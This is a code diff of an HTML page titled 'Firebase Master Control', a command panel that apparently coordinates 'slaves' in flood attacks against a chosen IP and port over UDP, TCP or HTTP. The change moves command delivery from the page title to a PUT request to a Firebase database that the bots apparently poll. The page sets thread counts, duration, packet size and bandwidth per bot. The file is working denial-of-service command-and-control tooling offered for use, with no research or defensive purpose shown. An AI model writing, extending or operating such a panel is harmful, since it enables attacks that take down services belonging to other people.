@@ -2,56 +2,64 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>STOP|0|0|stop|0|0|0|0</title>
+  <title>Firebase Master Control</title>
   <style>
-    body { font-family: Arial; background: #111; color: #0f0; text-align: center; padding: 30px; }
-    input, select, button { padding: 12px; margin: 8px; font-size: 16px; }
-    button { font-weight: bold; }
+    body { font-family: Arial; background: #0f0f0f; color: #0f0; padding: 20px; text-align: center; }
+    input, select, button { padding: 12px; margin: 10px; font-size: 16px; width: 280px; }
+    button { font-weight: bold; cursor: pointer; }
     .start { background: lime; color: black; }
     .stop  { background: red; color: white; }
   </style>
 </head>
 <body>
-  <h1>Static Master Control</h1>
+  <h1>🔥 Firebase Master Control</h1>
 
   <input id="ip" placeholder="Target IP" value="127.0.0.1"><br>
   <input id="port" placeholder="Port" value="53" type="number"><br>
   <select id="mode">
-    <option value="udp">UDP</option>
-    <option value="tcp">TCP</option>
-    <option value="http">HTTP</option>
+    <option value="udp">UDP (L4)</option>
+    <option value="tcp">TCP Connect</option>
+    <option value="http">HTTP (L7)</option>
   </select><br>
   <input id="threads" placeholder="Threads" value="25" type="number"><br>
   <input id="duration" placeholder="Duration (sec)" value="25" type="number"><br>
   <input id="psize" placeholder="Packet Size" value="1024" type="number"><br>
-  <input id="mbps" placeholder="Mbps per slave" value="4" type="number"><br><br>
+  <input id="mbps" placeholder="Target Mbps per slave" value="4" type="number"><br><br>
 
-  <button class="start" onclick="sendStart()">🚀 START ALL SLAVES</button>
-  <button class="stop" onclick="sendStop()">⛔ STOP ALL SLAVES</button>
+  <button class="start" onclick="startAttack()">🚀 START ALL SLAVES</button>
+  <button class="stop" onclick="stopAttack()">⛔ STOP ALL SLAVES</button>
 
   <script>
-    function updateTitle(action, ip, port, mode, threads, duration, psize, mbps) {
-      const title = `${action}|${ip}|${port}|${mode}|${threads}|${duration}|${psize}|${mbps}`;
-      document.title = title;
-      console.log("New Title Set:", title);
+    const DB_URL = "https://onlinegame-f5c20-default-rtdb.firebaseio.com/command.json";
+
+    async function startAttack() {
+      const data = {
+        action: "start",
+        target_ip: document.getElementById('ip').value,
+        port: parseInt(document.getElementById('port').value),
+        mode: document.getElementById('mode').value,
+        threads: parseInt(document.getElementById('threads').value),
+        duration: parseInt(document.getElementById('duration').value),
+        packet_size: parseInt(document.getElementById('psize').value),
+        target_mbps: parseFloat(document.getElementById('mbps').value),
+        timestamp: Date.now()
+      };
+
+      await fetch(DB_URL, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+      alert("🚀 START command sent to all slaves!");
     }
 
-    function sendStart() {
-      const ip = document.getElementById('ip').value;
-      const port = document.getElementById('port').value;
-      const mode = document.getElementById('mode').value;
-      const threads = document.getElementById('threads').value;
-      const duration = document.getElementById('duration').value;
-      const psize = document.getElementById('psize').value;
-      const mbps = document.getElementById('mbps').value;
-
-      updateTitle("START", ip, port, mode, threads, duration, psize, mbps);
-      alert("START command sent via page title!");
-    }
-
-    function sendStop() {
-      updateTitle("STOP", "0", "0", "stop", "0", "0", "0", "0");
-      alert("STOP command sent!");
+    async function stopAttack() {
+      await fetch(DB_URL, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: "stop", timestamp: Date.now() })
+      });
+      alert("⛔ STOP command sent!");
     }
   </script>
 </body>
